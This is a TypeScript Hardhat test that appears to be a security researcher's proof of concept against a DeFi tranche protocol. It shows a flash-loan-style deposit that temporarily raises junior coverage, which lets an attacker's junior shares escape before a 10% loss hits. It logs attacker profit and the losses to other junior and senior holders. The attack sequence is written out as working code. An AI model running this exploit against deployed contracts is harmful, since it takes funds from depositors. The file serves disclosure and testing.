import { HardhatProvider } from 'dequanto/hardhat/HardhatProvider';
import { UTest } from 'atma-utest';
import { $require } from 'dequanto/utils/$require';
import { $hh } from '../utils/$hh';
import { $erc20 } from '../utils/$erc20';
import { $erc4626 } from '../utils/$erc4626';
import { MockStakedUSDat } from '@0xc/hardhat/MockStakedUSDat/MockStakedUSDat';

/**
 * Cross-tranche impact PoC.
 *
 * Same current-Saturn-sized state as the live-scale PoC, but with a 10% global
 * sUSDat backing loss. In control, the pre-existing attacker JRT remains in the
 * protected tranche and Junior absorbs the strategy loss. In the bypass world,
 * temporary coverage lets 1.15m of old Junior exposure leave before the loss;
 * after the temporary sUSDat is repaid, only near-floor Junior protection remains.
 * The same 10% strategy loss can therefore exhaust remaining Junior and reduce
 * Senior NAV as well.
 *
 * The attacker still bears the same 10% ordinary sUSDat loss on the strategy
 * tokens held outside Strata. The differential is the escaped Junior first-loss
 * obligation, not avoidance of the underlying loss.
 */

const hh = new HardhatProvider();
const attacker = await hh.deployer(1);
const liquidityProvider = await hh.deployer(2);
const lender = await hh.deployer(3);
const test = await $hh.create('saturn');

const {
    jrtVault,
    srtVault,
    cdo,
} = await test.deploy({ initialDeposit: false });
const { base, sUSDat } = await test.factory.ensureUnderlying();
const { sharesCooldown } = await test.factory.ensureCooldowns(cdo);
const { deployer } = test;
const mockSUSDat = new MockStakedUSDat(sUSDat.address, sUSDat.client);

const JUNIOR_SEED = 1_760_000;
const SENIOR_SEED = 7_470_000;
const OLD_ATTACKER_JRT = 1_150_000;
const TEMP_LOAN_VALUE = 1_700_000n * 10n ** 6n;

await $erc20.mint(base, deployer, liquidityProvider, JUNIOR_SEED + SENIOR_SEED);
await $erc4626.depositMeta(jrtVault, base.address, liquidityProvider, JUNIOR_SEED);
await $erc4626.depositMeta(srtVault, base.address, liquidityProvider, SENIOR_SEED);
await $erc20.transfer(jrtVault, liquidityProvider, attacker.address, OLD_ATTACKER_JRT);

const loanShares = await sUSDat.convertToShares(TEMP_LOAN_VALUE);
await $erc4626.mint(sUSDat as any, lender, loanShares);
$require.eq(await sUSDat.balanceOf(lender.address), loanShares);

const coverageT0 = Number(await cdo.coverage());
$require.gt(coverageT0, 150_000);
$require.lt(coverageT0, 300_000);

await test.snapshot('transient-coverage-saturn-senior-loss');

UTest.create({
    async $after () {
        await test.wipe();
    },
    async $teardown () {
        await test.reset('transient-coverage-saturn-senior-loss');
    },

    async 'same 10% global loss reaches Senior only after transient-coverage bypass removes Junior protection' () {
        // ======================== Control ========================
        let oldShares = await jrtVault.balanceOf(attacker.address);
        let lpJrtShares = await jrtVault.balanceOf(liquidityProvider.address);
        let lpSrtShares = await srtVault.balanceOf(liquidityProvider.address);

        const controlImmediate = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            oldShares,
        );
        $require.eq(controlImmediate, 0n);
        $require.gt(await jrtVault.balanceOf(sharesCooldown.address), 0n);

        await applyGlobalTenPercentSUSDatLoss();
        await test.mine('7days');

        // Value the attacker's locked Junior claim instead of forcing a withdrawal:
        // after a large loss the independent hard floor can legitimately cap how
        // much JRT can be finalized, but the shares still have an economic value.
        const controlAttackerClaimValue = await jrtVault.convertToAssets(oldShares);
        const controlLpJrtValue = await jrtVault.convertToAssets(lpJrtShares);
        const controlSrtValue = await srtVault.convertToAssets(lpSrtShares);

        $require.gt(controlAttackerClaimValue, 0n);
        $require.gt(controlSrtValue, 0n);

        // ======================== Attack ========================
        await test.reset('transient-coverage-saturn-senior-loss');

        oldShares = await jrtVault.balanceOf(attacker.address);
        lpJrtShares = await jrtVault.balanceOf(liquidityProvider.address);
        lpSrtShares = await srtVault.balanceOf(liquidityProvider.address);

        await $erc20.transfer(sUSDat, lender, attacker.address, loanShares);
        await $erc4626.depositMeta(jrtVault, sUSDat.address, attacker, loanShares);
        $require.gt(Number(await cdo.coverage()), 300_000);

        const oldAssetsOut = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            oldShares,
        );
        $require.gt(oldAssetsOut, 0n);
        $require.gt(Number(await cdo.coverage()), 300_000);

        const temporaryShares = await jrtVault.balanceOf(attacker.address);
        const temporaryAssetsOut = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            temporaryShares,
        );
        $require.gt(temporaryAssetsOut, 0n);
        $require.eq(await jrtVault.balanceOf(sharesCooldown.address), 0n);

        const coverageAfterUnwind = Number(await cdo.coverage());
        $require.gt(coverageAfterUnwind, 75_000);
        $require.lt(coverageAfterUnwind, 100_000);

        // Temporary capital is gone before the loss.
        $require.gte(await sUSDat.balanceOf(attacker.address), loanShares);
        await $erc20.transfer(sUSDat, attacker, lender.address, loanShares);
        $require.eq(await sUSDat.balanceOf(lender.address), loanShares);

        await applyGlobalTenPercentSUSDatLoss();
        await test.mine('7days');

        const attackUnits = await sUSDat.balanceOf(attacker.address);
        const attackAttackerValue = await sUSDat.convertToAssets(attackUnits);
        const attackLpJrtValue = await jrtVault.convertToAssets(lpJrtShares);
        const attackSrtValue = await srtVault.convertToAssets(lpSrtShares);

        const attackerAdvantage = attackAttackerValue - controlAttackerClaimValue;
        const remainingJrtVictimLoss = controlLpJrtValue - attackLpJrtValue;
        const seniorVictimLoss = controlSrtValue - attackSrtValue;

        console.log('senior-loss initial coverage ppm', coverageT0.toString());
        console.log('senior-loss final coverage ppm', coverageAfterUnwind.toString());
        console.log('senior-loss control attacker claim', controlAttackerClaimValue.toString());
        console.log('senior-loss attack attacker value', attackAttackerValue.toString());
        console.log('senior-loss attacker advantage', attackerAdvantage.toString());
        console.log('senior-loss control remaining-JRT value', controlLpJrtValue.toString());
        console.log('senior-loss attack remaining-JRT value', attackLpJrtValue.toString());
        console.log('senior-loss remaining-JRT victim loss', remainingJrtVictimLoss.toString());
        console.log('senior-loss control SRT value', controlSrtValue.toString());
        console.log('senior-loss attack SRT value', attackSrtValue.toString());
        console.log('senior-loss Senior victim loss', seniorVictimLoss.toString());

        // Six decimals. Demand material cross-tranche impact, not dust.
        $require.gt(attackerAdvantage, 300_000n * 10n ** 6n);
        $require.gt(remainingJrtVictimLoss, 100_000n * 10n ** 6n);
        $require.gt(seniorVictimLoss, 100_000n * 10n ** 6n);
    },
});

async function applyGlobalTenPercentSUSDatLoss () {
    const backingBefore = await mockSUSDat.usdatBalance();
    $require.gt(backingBefore, 0n);
    await mockSUSDat.$receipt().setUsdatBalance(
        deployer,
        backingBefore * 90n / 100n,
    );
}
